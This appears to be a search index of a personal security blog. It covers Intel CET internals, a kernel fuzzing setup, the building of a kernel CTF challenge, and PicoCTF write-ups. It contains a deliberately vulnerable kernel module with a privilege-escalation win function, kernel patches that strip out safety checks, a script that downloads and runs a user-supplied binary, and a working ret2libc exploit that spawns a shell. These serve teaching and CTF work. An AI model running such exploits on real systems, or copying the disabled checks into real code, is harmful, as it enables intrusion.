{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"<p>My posts about low-level internals of whatever I've got my hands on at the moment</p> <ul> <li> nofilq</li> <li> papadoxie</li> <li> nofil-qasim</li> </ul>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/","title":"Overview","text":"<p>Intel CET is a hardware assisted mitigation against control-flow hijacking attacks in Intel x86 and x86-64 processors. It introduces two new mitigation techniques: - SHSTK - IBT</p> <p>SHSTK and IBT exist to deal with ROP and JOP/COP respectively. Specifically SHSTK is a backward-edge CFI mitigation and IBT is a forward-edge CFI mitigation.  </p> <p>CET requires a complex and thorough chain of support from both hardware and software. Since hardware and software implementation details both are quite extensive, we will structure the following document into multiple parts.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#where-does-cet-fit","title":"Where does CET fit?","text":"<p>CET is a cross between a reactive and a proactive measure. It kicks in after memory has already been corrupted and tries to stop an attacker from developing that into a control flow primitive.  Typically after memory corruption, there are two main ways for an attacker to take control of the IP and hijack the control flow to perform malicious behavior: 1. ## Overwrite the Return Address (Backward Edge)    Attackers can overwrite the return address of a function on the function stack. When a function returns, this address is popped off the stack and placed in the IP register. If an attacker controls this address they can divert control flow to an address of their liking and execute instructions from there.    ROP is one of the techniques that can be used to create an exploit after getting control of the return address. Attackers can chain together a series of instructions already available within the executable sections of the program to create their own malicious program that runs inside the target process.    Typically one link (or gadget) in a ROP chain consists of a set of one or more instructions that end with the <code>ret</code> instruction. This means that after each gadget executes, there will be a <code>return</code> which leads to the next gadget in the chain. Hence the name Return Oriented Programming.    To mitigate this, shadow stacks can be used. A shadow stack is a secondary stack that cannot be modified even if an attacker obtains memory corruption on the regular stack. When a function is called, the return address is pushed on both the regular stack and the shadow stack. When the <code>ret</code> instruction is executed, the return address is popped off the regular stack and the shadow stack and then compared with one another. If they don't match, as is the case when an attacker overwrites the return address, the CET mechanism triggers an exception and process execution is terminated. 2. ## Overwrite an Address on the Forward Edge    Many programs contain mutable addresses on the forward edge e.g. function pointers, jump tables, v-tables for class methods, etc. These addresses are used in indirect branch statements e.g. <code>jmp rax</code> or <code>call rcx</code>, instead of the typical direct branches e.g. <code>jmp 0x4010</code> . If an attacker controls one or more of these addresses, they can point it towards a ROP gadget, thereby triggering a ROP chain. They can also point it towards a JOP/COP gadget.    COP and JOP are similar to ROP. JOP consists of a sequence of instructions that end with a <code>jmp</code> or similar instruction. COP consists of a sequence of instructions that end with a <code>call</code> statement    To mitigate this, Indirect Branch Tracking can be used. The code that the IP jumps to after a branch instruction is called a branch target. If the target is an indirect branch, compilers can place a special <code>endbr64</code> or <code>endbr32</code> end-branch instruction to specify that it is a valid branch target. When IBT is enabled, all indirect branch instructions must resolve to a target that has the end-branch instruction otherwise the CET mechanism triggers an exception and process execution is terminated.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#hardware-specification","title":"Hardware Specification","text":"<p>The CET implementation in hardware consists of extensions to the Intel x86 and x86-64 ISA. </p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#control-protection-exception-cp","title":"Control Protection Exception (#CP)","text":"<p>CET introduces a new Control Protection (#CP) exception class with interrupt vector 21. This exception is raised when a control flow instruction results in a transfer that violates the constraints introduced by CET.  </p> <p>\u2757NOTE: The CP exception occurs before the control flow instruction is actually executed</p> <p>CP is part of the contributory class of exceptions which means that if another contributory exception is raised during CP handling, it will trigger a Double Fault.</p> <p>![[Pasted image 20250703163556.png]]</p> <p>When this exception is raised, an error code is pushed on the stack which tells the CP exception handler what event caused the exception. An exception may be raised by the following events: - SHSTK violation after near <code>ret</code> - SHSTK violation after far <code>ret</code> - SHSTK violation after <code>iret</code> - Missing <code>endbr</code> instruction at indirect branch target - Token check failure after <code>rstorssp</code> - Token check failure after <code>setssbsy</code></p> <p>The contents of the CS and IP registers are saved to keep track of what instruction caused the CP exception.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#cet-components","title":"CET Components","text":"<p>As we discussed before, CET is a name for two mitigation techniques. SHSTK and IBT. From an implementation perspective, these can be further broken down in the following:  - Supervisor Shadow Stack or Kernel Shadow Stack - User Space Shadow Stack - Kernel IBT - User Space IBT</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#enabling-cet-in-the-hardware","title":"Enabling CET in the Hardware","text":"<p>To enable CET in the hardware, bit 23 of the CR4 register must be set. This is also known as CR4.CET or the CET Master Enable. Setting this bit does not mean SHSTK and IBT will work. Each CET feature must be enabled on its own using an MSR. The following two MSR's are available for CET features: - <code>MSR IA32_U_CET (0x6A0)</code>: User space CET - <code>MSR IA32_S_CET (0x6A2)</code>: Kernel space CET There are 5 other MSR's that store shadow stack addresses for different ring privilege levels.</p> <p>\u2757NOTE: User space CET refers to <code>CPL3</code> and Kernel space CET refers to <code>CPL0</code> in the ring privilege model</p> <p>The above two MSR's both follow the same format:</p> Bit Feature Name Description 0 <code>SH_STK_EN</code> Enable shadow stack 1 <code>WR_SHSTK_EN</code> Enable WRSS 2 <code>ENBR_EN</code> Enable IBT 3 <code>LEG_IW_EN</code> Enable legacy IBT support 4 <code>NO_TRACK_EN</code> Enable the <code>notrack</code> prefix 5 <code>SUPPRESS_DIS</code> Disable IBT suppression 6-9 <code>RSVD</code> Reserved (always 0) 10 <code>SUPPRESS</code> Suppress IBT 11 <code>TRACKER</code> Tracks the state of the IBT state machine 12-63 <code>EB_LEG_BITMAP_BASE</code> Address of valid branch targets without <code>endbr</code> <p>Setting the MSR bits as shown in the above table enables and configures CET features as needed. As we can see, there is some new terminology in the table, so let's now discuss those.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#wrss-write-to-shadow-stack","title":"WRSS (Write to Shadow Stack)","text":"<p>The <code>WR_SHSTK_EN</code> flag enables the <code>wrss</code> instruction. This allows writes to the shadow stack in a controlled manner. Manual writes to the shadow stack may only be done via this instruction. Directly writing to shadow stack memory by dereferencing a pointer is not allowed.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#legacy-ibt-support","title":"Legacy IBT Support","text":"<p>The <code>LEG_IW_EN</code> flag enables support for IBT enabled systems to run non IBT supported code. This allows code running with IBT support to perform indirect jumps into code that is not built with IBT support i.e. code that does not have <code>endbr</code> on the indirect branch targets. The <code>EB_LEG_BITMAP_BASE</code> field contains an address to a bitmap. This bitmap points to pages in memory that contain legacy code without the <code>endbr</code> instruction. On a system where IBT is enabled and <code>SUPPRESS</code> is not set, a process may perform an indirect jump into any page referred to by this bitmap without raising  a CP exception.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#no-track","title":"No Track","text":"<p>The <code>NO_TRACK_EN</code> flag enables the use of the <code>notrack</code> instruction. Prefacing an indirect branch instruction with <code>notrack</code>, disables IBT for that specific control flow transfer e.g. <code>notrack call [rax]</code>.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#ibt-suppression","title":"IBT Suppression","text":"<p>The <code>SUPPRESS</code> and <code>SUPPRESS_DIS</code>flags are used to control the ability of the IBT mechanism to raise the CP exception. When <code>SUPPRESS</code> is enabled, IBT wont raise an exception. When <code>SUPRRESS_DIS</code> is enabled, the value of the <code>SUPPRESS</code> flag will be ignored and raising CP will not be blocked.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#rsvd-reserved","title":"RSVD (Reserved)","text":"<p>These bits of the MSR are reserved for potential future use. For now, they must always be set to 0.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#tracker","title":"Tracker","text":"<p>This bit tracks the state of the IBT state machine. The IBT state machine has 2 possible states: - <code>0</code>: IDLE - <code>1</code>: WAIT_FOR_ENDBRANCH When an indirect branch instruction is executed, the IBT state machine enters the WAIT_FOR_ENDBRANCH state. When an <code>endbr</code> instruction is encountered, the state machine returns to the IDLE state.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#shadow-stack","title":"Shadow Stack","text":"<p>The shadow stack is a secondary stack that is managed parallel to each program stack. It is only used for storing data relevant to control flow operations.</p>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#references","title":"References","text":"<ul> <li>Intel\u00ae Control-Flow Enforcement Technology Specification Document Number: 334525-003, Revision 3.0 https://kib.kiev.ua/x86docs/Intel/CET/334525-003.pdf</li> <li>Intel\u00ae 64 and IA-32 Architectures Software Developer\u2019s Manual, Volume 3 (Section: Interrupt and Exception Handling) https://cdrdv2.intel.com/v1/dl/getContent/671447</li> <li>Shadow stacks for user space https://lwn.net/Articles/885220/</li> </ul>"},{"location":"Control-Flow%20Enforcement%20Technology%20%28CET%29/#appendix","title":"Appendix","text":"<ul> <li>CET: Control-Flow Enforcement Technology</li> <li>SHSTK: Shadow Stack ^be1b31</li> <li>IBT: Indirect Branch Tracking ^d764c4</li> <li>ROP: Return Oriented Programming ^54ccb0</li> <li>JOP: Jump Oriented Programming ^976c8f</li> <li>COP: Call Oriented Programming ^4cae67</li> <li>CFI: Control Flow Integrity ^cd12c6</li> <li>IP: Instruction Pointer. Also known as Program Counter (PC) ^c1ec26</li> <li>Branch Instruction: An instruction that diverts control flow from the normal sequential flow e.g. <code>jmp</code>, <code>call</code>, <code>loop</code> ^1f7552</li> <li>Branch Target: The address that is loaded into the IP after a branch instruction is executed ^d2bc84</li> <li>Direct Branch: A branch whose target is predetermined and usually immutable. Typically these are offsets from the IP</li> <li>Indirect Branch: A branch whose target is variable and computed at run-time ^661483</li> <li>ISA: Instruction Set Architecture ^4bf34c</li> <li>#CP: Control Protection Exception in Intel x86 and x86-64 processors</li> <li>MSR: Model Specific Register. Registers in CPU's that are used to enable or disable processor specific features. ^bf5096</li> <li>Ring Privilege Level: Levels in the ring privilege model for CPU's, i.e. <code>CPL0 - CPL3</code> ^ac2db0</li> </ul>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/","title":"Kernel Fuzzing with syzkaller on ESXi","text":"<p>Finding the proper infrastructure to fuzz the Linux kernel can be a tricky thing. You don't want to do it on your daily use machine since it'll hog up all the resources and get in the way of work. You also need something that will keep running 24/7 without interruption for at least a few months. Enter V-Lab.</p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#v-lab","title":"V-Lab","text":"<p>V-Lab is the VMWare ESXi set up that I have at my workplace. It runs on a machine with the following specs: - Intel Xeon E5-2660v4 with 24 cores and 56 threads @ 2.00 GHz - 64 GB Memory  - 2.0 TB Disk Space</p> <p>Not the most powerful server you could use for fuzzing but it can get the job done.</p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#virtual-machines","title":"Virtual Machines","text":"<p>Initially I decided to go the simple old route of setting up one mega VM with loads of CPU cores and memory, and use nested virtualization to spin up further VMs for fuzzing the kernel. I quickly ran into lots of issues however. SSH refused to work inside my nested VMs when syzkaller tried to spin them up automatically. Even if I resolved those issues I would still end up with sub-par performance due to nested virtualization.</p> <p>Then I decided to go for the following set up:  </p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#controller-vm","title":"Controller VM","text":"<pre><code>- OS: Ubuntu 22.04 LTS\n- Cores: 8\n- Memory: 16 GB\n- Hard Disk: 50 GB\n</code></pre>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#fuzz-vms","title":"Fuzz VMs","text":"<pre><code>- Count: 10\n- OS: Arch Linux\n- Cores: 2\n- Memory: 2 GB\n- Hard Disk: 8 GB\n</code></pre>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#setting-up-the-controller-vm","title":"Setting up the Controller VM","text":""},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/","title":"Making a Kernel CTF (PUCon'24 pwn CTF)","text":"<p>Recently I had the pleasure of designing some challenges for a CTF held at my alma mater, University of the Punjab. Despite having reasonable experience with solving kernel challenges in the past, this was my first time actually making a kernel challenge on my own.</p> <p>The idea was pretty simple, write a module that had a simple buffer overflow that led to RIP control. The execution however, was not that simple, so I decided to write this blog to document everything it took to set my challenges up.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#environment","title":"Environment","text":"<p>The challenge was going to be hosted on CTFd's managed hosting so it had to be able to run in a Docker container. Since the container was going to run on CTFd infrastructure, we couldn't be sure what kernel we were going to get. To get past this we decided to run our challenge inside a <code>qemu</code> VM inside our container.  </p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#vm","title":"VM","text":"<p>Initially for the guest OS, we went with the syzcaller debootstrap script (https://github.com/google/syzkaller/blob/master/tools/create-image.sh) that sets up a fully featured Debian image for us.  After setting it up we found out the VM was using way more memory than what CTFd allowed for one container so we switched to using a simple <code>initramfs</code> with <code>busybox</code> setup. Our setup was similar to <code>hxp-ctfs</code> kernel ROP challenge (https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) with a modified <code>run.sh</code> script.</p> <pre><code>read -p \"Enter the link to your exploit binary: \" link\n\nwget $link -O exploit\nchmod 777 ./exploit\nsleep 1\n./decompress.sh\nrm intramfs/exploit\ncp ./exploit initramfs/\n./compress.sh\n\nqemu-system-x86_64 \\\n  -snapshot \\\n  -kernel kernel/arch/x86/boot/bzImage \\\n  -smp cores=1,threads=1 \\\n  -initrd initramfs.cpio.gz \\\n  -append \"console=ttyS0 debug earlyprintk=serial oops=panic nokaslr smap smep selinux=0 pti tsc=unstable net.ifnames=0 panic=1000 cgroup_disable=memory\" \\\n  -net nic -net user,hostfwd=tcp::${SSH_PORT}-:22 \\\n  -nographic \\\n  -m 128M \\\n  -monitor none,server,nowait,nodelay,reconnect=-1 \\\n  -cpu kvm64,+smap,+smep \\\n  2&gt;&amp;1\n</code></pre> <p>Since the exploit was supposed to run locally on the VM, we provided a way for the contestants to upload their exploit as soon as they connected by reading in a link at the start and downloading a file from there and putting it in the <code>initramfs</code>.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#container","title":"Container","text":"<p>The container environment was pretty simple. <code>cpio</code> and <code>gzip</code> were required to modify the <code>initramfs</code> and put the contestants exploits into the VM. <code>wget</code> was used to download the exploit. <code>qemu</code> was used to run the VM.  </p> Dockerfile<pre><code>FROM ubuntu:latest\n\nRUN apt-get update\nRUN apt-get install -y qemu qemu-system-x86 qemu-utils socat cpio gzip wget \n\nEXPOSE 1337\n\nRUN useradd -d /home/ctf -m -p ctf -s /bin/bash ctf\nRUN echo \"ctf:ctf\" | chpasswd\nRUN ulimit -c 0\n\nWORKDIR /home/ctf\nCOPY kernel ./kernel\nCOPY run.sh ./run.sh\nCOPY initramfs.cpio.gz ./initramfs.cpio.gz\nCOPY compress.sh ./compress.sh\nCOPY decompress.sh ./decompress.sh\nRUN chmod +x *.sh\nRUN chmod 666 ./initramfs.cpio.gz\n\nEXPOSE 1337\nUSER ctf\nCMD socat tcp-l:1337,reuseaddr,fork EXEC:\"./run.sh\",pty,stderr\n</code></pre> <p>Initially we used <code>ynetd</code> to serve the challenge but for some reason, one night before the CTF was supposed to star, <code>ynetd</code> decided to bail on us and started sending EOF on <code>stdin</code> as soon as we attempted to connect. For this reason we shifted to using <code>socat</code>. Unfortunately this meant the shell that was served was unstable by default and we only figured out how to connect to it stably after the competition ended. Fortunately the kernel challenges were able to be solved with unstable shells. <pre><code>socat file:`tty`,raw,echo=0 tcp:&lt;challenge-link&gt;:&lt;port&gt;\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#kernel","title":"Kernel","text":"<p>The kernel we chose was <code>v6.6.16</code> and we applied some of our own patches to make it easier to exploit.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#added-exports","title":"Added Exports","text":"<p>Some symbols were exported so we could directly use them to make a win function in our module. kernel/cred.c<pre><code>EXPORT_SYMBOL(init_cred)\n</code></pre></p> kernel/reboot.c<pre><code>EXPORT_SYMBOL(run_cmd)\n</code></pre>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#removing-safety-checks-in-code","title":"Removing Safety Checks in Code","text":"<p>We had to remove the size check in <code>copy_to_user</code> and <code>copy_from_user</code> to make sure our module would actually receive more bytes than the buffer could hold. <code>include/linux/uaccess.h</code> <pre><code>static __always_inline unsigned long __must_check\ncopy_from_user(void *to, const void __user *from, unsigned long n)\n{\n    // if (check_copy_size(to, n, false))\n        n = _copy_from_user(to, from, n);\n    return n;\n}\n\nstatic __always_inline unsigned long __must_check\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n{\n    // if (check_copy_size(from, n, true))\n        n = _copy_to_user(to, from, n);\n    return n;\n}\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#removing-safety-checks-in-config","title":"Removing Safety Checks in Config","text":"<p>We used <code>defconfig</code> which was based on <code>x86_64_defconfig</code> and edited it to turn off mitigations. .config<pre><code>CONFIG_CC_HAS_RETURN_THUNK=n\nCONFIG_CALL_PADDING=n\nCONFIG_HAVE_CALL_THUNKS=n\nCONFIG_CALL_THUNKS=n\nCONFIG_PREFIX_SYMBOLS=n\nCONFIG_RETPOLINE=n\nCONFIG_RETHUNK=n\nCONFIG_CPU_UNRET_ENTRY=n\nCONFIG_CALL_DEPTH_TRACKING=n\nCONFIG_CPU_IBPB_ENTRY=n\nCONFIG_CPU_IBRS_ENTRY=n\nCONFIG_CPU_SRSO=n\nCONFIG_STACKPROTECTOR=n\nCONFIG_STACKPROTECTOR_STRONG=n\n</code></pre></p> <p>Retpoline and return thunk proved hard to turn off for some reason. Setting their variables to <code>n</code> wouldn't work and they'd get set to <code>y</code> as soon as we started the build. To get past this we had to remove the options directly from <code>arch/x86/Kconfig</code></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#vulnerable-module","title":"Vulnerable Module","text":"<p>The module was pretty simple. It created a device that you could write to and read from. The vulnerability was in the unchecked read by the <code>copy_from_user</code> function that we patched earlier. <code>copy_from_user</code> was used to read unbounded data written from user-space into a kernel buffer of size 256 bytes.  </p> <p>We added a <code>file_sending_system</code> win function that escalated privileges using <code>commit_creds(&amp;init_cred)</code> and then read a file from the file-system using the <code>kernel_read_file_from_path</code> function defined in <code>fs/kernel_read_file.c</code>. We had to add pragmas to ensure this function would not be optimized out by the compiler since it wasn't being called anywhere. vuln.c<pre><code>MODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"papadoxie\");\nMODULE_DESCRIPTION(\"Kernel Messaging System\");\nMODULE_VERSION(\"1337\");\n\nstatic int majorNumber;\nstatic char *message_to_return = NULL;\nstatic int size_of_message;\nstatic struct class *messageClass = NULL;\nstatic struct device *messageDevice = NULL;\n\nstatic struct file_operations fops =\n{\n        .open = dev_open,\n        .read = dev_read,\n        .write = dev_write,\n        .release = dev_release,\n};\n\n#pragma GCC push_options\n#pragma GCC optimize(\"O0\")\n__attribute__((unused)) \n__attribute((noreturn))\nvolatile static int file_sending_system(void)\n{\n    printk(KERN_INFO \"Messager: In the future I'll be able to send files to the kernel too!\\n\");\n    printk(KERN_INFO \"Messager: No need to enable this function since it isn't completed\\n\");\n\n    char *file_path = \"/root/flag.txt\";\n    loff_t offset = 0;\n    size_t bufsize = 64;\n    size_t filesize = 4096;\n    enum kernel_read_file_id id = 0;\n    void *file_buf = kmalloc(bufsize, GFP_KERNEL);\n\n    commit_creds(&amp;init_cred);\n    kernel_read_file_from_path(file_path, offset, &amp;file_buf, bufsize, &amp;filesize, id);\n    printk(KERN_INFO \"Messager: File content: %s\\n\", (char *)file_buf);\n    while(1)\n        ;\n}\n#pragma GCC pop_options\n\nstatic int __init mod_init(void)\n{\n    printk(KERN_INFO \"#####################################################################################\\n\");\n    printk(KERN_INFO \"\\tPAPADOXIE'S EASY KERNEL MESSAGING SYSTEM\\n\");\n    printk(KERN_INFO \"\\tTransfer your message to the kernel and get a response back promptly!\\n\");\n    printk(KERN_INFO \"\\tMessager: Initializing......\\n\");\n    printk(KERN_INFO \"#####################################################################################\\n\");\n\n\n    majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops);\n    if (majorNumber &lt; 0)\n    {\n        printk(KERN_ALERT \"Messager: Failed to register a major number\\n\");\n        return majorNumber;\n    }\n    printk(KERN_INFO \"Messager: Registered correctly with major number %d\\n\", majorNumber);\n\n    messageClass = class_create(CLASS_NAME);\n    if (IS_ERR(messageClass))\n    {\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"Messager: Failed to register device class\\n\");\n        return PTR_ERR(messageClass);\n    }\n    printk(KERN_INFO \"Messager: Device class registered correctly\\n\");\n\n    messageDevice = device_create(messageClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);\n    if (IS_ERR(messageDevice))\n    {\n        class_destroy(messageClass);\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"Failed to create the device\\n\");\n        return PTR_ERR(messageDevice);\n    }\n    printk(KERN_INFO \"Messager: device class created correctly\\n\");\n    return 0;\n}\n\nstatic void __exit mod_exit(void)\n{\n    device_destroy(messageClass, MKDEV(majorNumber, 0));\n    class_unregister(messageClass);\n    class_destroy(messageClass);\n    unregister_chrdev(majorNumber, DEVICE_NAME);\n    printk(KERN_INFO \"Messager: Goodbye from the LKM!\\n\");\n}\n\nstatic int dev_open(struct inode *inodep, struct file *filep)\n{\n    printk(KERN_INFO \"Messager: Kernel communication link established\\n\");\n    return 0;\n}\n\nstatic ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset)\n{\n    int error_count = 0;\n    error_count = copy_to_user(buffer, message_to_return, size_of_message);\n\n    if (error_count == 0)\n    {\n        printk(KERN_INFO \"Messager: Sent %d characters to the user\\n\", size_of_message);\n        kfree(message_to_return);\n        return (size_of_message = 0);\n    }\n    else\n    {\n        printk(KERN_INFO \"Messager: Failed to send %d characters to the user\\n\", error_count);\n        return -EFAULT;\n    }\n}\n\nstatic ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)\n{\n    char message[256];\n    if (copy_from_user(message, buffer, len))\n    {\n        printk(KERN_ALERT \"Messager: Failed to copy data from user\\n\");\n        return -EFAULT;\n    }\n\n    message_to_return = kmalloc(len, GFP_KERNEL);\n    memcpy(message_to_return, message, len);\n\n    size_of_message = len;\n    printk(KERN_INFO \"Messager: Received %zu characters from the user\\n\", len);\n    return len;\n}\n\nstatic int dev_release(struct inode *inodep, struct file *filep)\n{\n    printk(KERN_INFO \"Messager: Device successfully closed\\n\");\n    return 0;\n}\n\nmodule_init(mod_init);\nmodule_exit(mod_exit);\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#deployment","title":"Deployment","text":"<p>After setting all that up locally, it was time to deploy the challenge on CTFd. This was as simple as deploying any other challenge. First we built the Docker image for the challenge and tagged it. Then we pushed it to the CTFd repo and it miraculously worked...... after 3 days of debugging and rewriting.</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/","title":"CacheMeOutside","text":"<p>&lt;&lt; Back to Home</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#cache-me-outside","title":"Cache Me Outside","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#setup","title":"Setup","text":"<p>3 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Lets download the files and try to run the binary</p> <p></p> <p>We get a crash This occurs because our linker is a newer version than the libc provided</p> <p></p> <p>We can fix this using pwninit which will automatically take care of this</p> <p></p> <p>Lets try running it now</p> <p></p> <p>Hmm, it still crashes Lets open the binary in Ghidra and take a look at whats going on</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#analysis","title":"Analysis","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#exploitation","title":"Exploitation","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/","title":"HeresALIBC","text":"<p>&lt;&lt; Back to Home</p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#heres-a-libc","title":"Here's a LIBC","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#setup","title":"Setup","text":"<p>3 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Lets download the files and try to run the binary</p> <p></p> <p>We get a crash This occurs because our linker is a newer version than the libc provided</p> <p></p> <p>We can fix this using pwninit which will automatically take care of this</p> <p></p> <p>This fixed the problem</p> <p></p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#analysis","title":"Analysis","text":"<p>Lets open the binary in Ghidra and take a look at whats going on</p> <p></p> <p>There is no input being taken in the main function but we see another function Lets check it out</p> <p></p> <p>This looks like what we are looking for I have retyped some variables so its easier to understand As we can see there is no bound checking on the scanf input We can easily overflow the buffer since scanf will take an input until it encounters a newline</p> <p></p> <p>Sure enough, we get a segmentation fault and the program crashes  </p> <p>Lets check the protections on the binaries</p> <p></p> <p>The stack is not executable so we can't execute shellcode pushed onto it PIE is off for vuln meaning addresses won't change for the binary on each execution This means we can easily leak an address from libc and use it to return to libc</p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#exploitation","title":"Exploitation","text":"<p>Lets open the binary in GDB and find exactly where we overwrite RIP</p> <p></p> <p></p> <p>Now we need to find some ROP Gadgets to leak the address of a function in libc We can use pwntools ROPgadget for this  </p> <p>We will use the puts() function to print out an address in libc so we also need the address of puts@plt We can leak the address of any function inside libc. I have chosen setbuf()</p> <p>To print the address of setbuf() in libc we need to pass the address of setbuf@got to puts() For this we will need to find a ROP Gadget that will allow us to modify RDI</p> <p></p> <p></p> <p></p> <p>Now that we have found the relevant addresses we can leak the address of setbuf() inside libc</p> <pre><code>import pwnlib.util.packing as pack\nfrom pwn import log, process, remote\n\np = process(\"./vuln\")  # Local binary\n\npadding = b\"A\" * 136\npop_rdi = 0x400913  # ROP Gadget for popping rdi\nsetbuf_at_got = 0x601028  # Address of setbuf() in GOT\nputs_at_plt = 0x400540  # Address of puts() in PLT\nmain = 0x400771  # Address of main for returning safely after leaking setbuf() address in libc\n\n# ? Craft the payload to leak address of setbuf in libc\npayload = padding  # Pad the stack until the stored RIP\npayload += pack.p64(pop_rdi)  # Set the address of setbuf() in GOT as the first argument of puts()\npayload += pack.p64(setbuf_at_got)  # This will be the first argument of puts()\npayload += pack.p64(puts_at_plt)  # Call puts()\npayload += pack.p64(main)  # Return to main() so the program doesnt crash\n\n# ? Send the payload\np.sendline(payload)\np.recvline()  # Discard data we dont need\np.recvline()  # Discard data we dont need\nleak = pack.u64(p.recvline().strip().ljust(8, b\"\\x00\"))  # Format the address of setbuf() properly\nlog.info(f\"Leaked setbuf Address -&gt; {hex(leak)}\")\n</code></pre> <p></p> <p>Now that we have an address inside libc we can calculate the base address of libc itself First lets figure out the offset of setbuf() from the base address of libc</p> <p></p> <p>Now we can add this to our exploit</p> <pre><code>setbuf_offset = 0x88540  # Static offset of setbuf() in libc\nlibc_base = leak - setbuf_offset  # Calculate base address of libc\nlog.info(f\"libc Base Address -&gt; {hex(libc_base)}\")\n</code></pre> <p>To get a shell on the target system we will use the system() function which is also inside libc Lets find its address</p> <p></p> <pre><code>system_offset = 0x4F4E0  # Static offset of system() in libc\nlibc_system = libc_base + system_offset # Calculate the actual address of system() in libc\nlog.info(f\"system Address -&gt; {hex(libc_system)}\")\n</code></pre> <p>We can pass \"/bin/sh\" to system() to get a shell As this string is already present inside libc we dont need to put it on the stack ourselves We can simply use the one already available to us Lets find its address </p> <p></p> <pre><code>binsh_offset = 0x1B40FA  # Static offset of /bin/sh string in libc\nlibc_binsh = libc_base + binsh_offset\nlog.info(f\"/bin/sh Address -&gt; {hex(libc_binsh)}\")\n</code></pre> <p>Now that we have all the relevant addresses we can finally craft our final payload Here is the remaining exploit</p> <pre><code># ? Craft the payload to call system(\"/bin/sh\")\npayload = padding  # Pad the stack until the stored RIP\npayload += pack.p64(pop_rdi)  # Set the address of the string /bin/sh as the first argument of system()\npayload += pack.p64(libc_binsh)  # This will be the first argument of system()\npayload += pack.p64(ret)  # Align the stack to 16 bytes otherwise system() will crash\npayload += pack.p64(libc_system)  # Call system()\n\n# ? Send the payload\np.sendline(payload)\n\n# ? Start an interactive session\np.interactive()\n</code></pre> <p>Notice we added another ROP Gadget (ret). This is to align the stack for the call to system() If the stack isn't aligned then we will get a segmentation fault and the program will crash Lets run the exploit script against the target server now</p> <p></p> <p>Nice. It works Now we can grab the flag</p> <p></p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/","title":"UnsubscriptionsAreFree","text":"<p>&lt;&lt; Back to 